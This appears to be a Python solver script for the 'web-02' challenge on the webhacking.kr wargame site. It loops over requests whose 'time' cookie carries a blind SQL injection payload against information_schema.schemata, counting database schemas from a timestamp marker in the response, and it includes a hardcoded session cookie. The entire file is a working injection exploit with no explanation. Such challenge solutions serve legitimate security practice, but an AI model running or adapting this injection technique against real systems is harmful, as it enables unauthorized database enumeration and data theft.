import requests

url = "https://webhacking.kr/challenge/web-02/"

count = 0
while True:
    cookies = {'PHPSESSID': 'r9qrd0teu3uhiaubfl9qfbuid7','time':'(1<2) & (IFNULL((SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT {0}, 1) > 0, 0))'.format(count)}

    req = requests.get(url=url, cookies=cookies)
    req = req.text
    if req.count("2070-01-01 09:00:00") != 0:
        break
    count += 1

print(count)  
